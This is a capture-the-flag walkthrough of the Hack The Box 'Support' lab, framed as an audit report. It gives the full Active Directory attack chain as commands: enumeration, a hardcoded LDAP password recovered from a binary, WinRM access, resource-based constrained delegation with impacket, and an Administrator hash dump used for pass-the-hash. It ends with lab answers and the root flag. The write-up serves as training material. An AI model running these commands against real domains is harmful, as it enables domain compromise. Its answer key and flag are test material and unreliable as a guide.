# Security Audit Report
================================================================================
WALKTHROUGH: HACK THE BOX - SUPPORT
================================================================================

1. RECONNAISSANCE AND ENUMERATION
--------------------------------------------------------------------------------
* Massive port scan:
  nmap -p- --open -n -Pn -sS --min-rate 5000 -vvv 10.129.98.131 -oG allPorts

* Service and version scan:
  nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49688,49693,49706 -sCV 10.129.98.131 -oN target

* SMB Enumeration:
  Discovered a non-default shared folder named "support-tools", containing administrative utilities and a custom binary called "UserInfo.exe".


2. CREDENTIAL ANALYSIS AND INITIAL ACCESS
--------------------------------------------------------------------------------
* Decompiling the .NET binary using ilspycmd to extract hardcoded credentials:
  ilspycmd UserInfo.exe > decompiled.cs

* Revealing the plaintext LDAP password after reversing the XOR/Base64 logic:
  - LDAP Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

* Active Directory lookup via LDAP:
  Identified that the "info" attribute of the "support" user account stores a complementary password:
  - Support Password: Ironside47pleasure40Watchful

* Interactive access via WinRM (Port 5985):
  evil-winrm -i 10.129.98.131 -u 'support' -p 'Ironside47pleasure40Watchful'
  *(From here, the user flag is captured).*


3. BLOODHOUND ANALYSIS AND ATTACK PATH
--------------------------------------------------------------------------------
* BloodHound collection revealed that:
  - The "support" account belongs to the "SHARED SUPPORT ACCOUNTS" group.
  - This group holds the "GenericAll" privilege over the Domain Controller computer object ("DC.SUPPORT.HTB").


4. EXPLOITATION: RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)
--------------------------------------------------------------------------------
* Creating a fake computer account in the domain (leveraging the quota set by the ms-DS-MachineAccountQuota attribute):
  impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip 10.129.98.131 -computer-name 'FAKECOMP$' -computer-pass 'CompPass123!'

* Configuring the RBCD link to grant delegation control:
  impacket-rbcd 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip 10.129.98.131 -action write -delegate-from 'FAKECOMP$' -delegate-to 'DC$'

* Requesting a Kerberos ticket (S4U2Self/S4U2Proxy) impersonating the Administrator user:
  impacket-getST 'support.htb/FAKECOMP$:CompPass123!' -dc-ip 10.129.98.131 -impersonate Administrator -spn cifs/DC.SUPPORT.HTB


5. FINAL PRIVILEGE ESCALATION AND ROOT FLAG
--------------------------------------------------------------------------------
* Configuring the mandatory environment variable for the generated ccache file:
  export KRB5CCNAME="Administrator@cifs_DC.SUPPORT.HTB@SUPPORT.HTB.ccache"

* Static resolution in /etc/hosts:
  echo "10.129.98.131 dc.support.htb support.htb" | sudo tee -a /etc/hosts

* Dumping the Administrator NT hash using secretsdump:
  impacket-secretsdump -k -no-pass -dc-ip 10.129.98.131 -just-dc-user Administrator support.htb/Administrator@dc.support.htb
  - Retrieved Hash: bb06cbc02b39abeddd1335bc30b19e26

* Final WinRM connection with Administrator privileges:
  evil-winrm -i 10.129.98.131 -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
  *(From here, the root flag is read).*

================================================================================
LAB QUESTIONS / KEY ANSWERS:
--------------------------------------------------------------------------------
* Non-default SMB share: support-tools
* Non-standard file in the share: UserInfo.exe
* Hardcoded LDAP password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
* Suspicious LDAP attribute: info
* BloodHound privilege on DC: GenericAll
* Computer account quota attribute: ms-DS-MachineAccountQuota
* Ticket conversion utility: ticketConverter.py
* Environment variable for ccache: KRB5CCNAME
* Root Flag: d6ca5fdab2afe28e2fb7bd541929724a
================================================================================
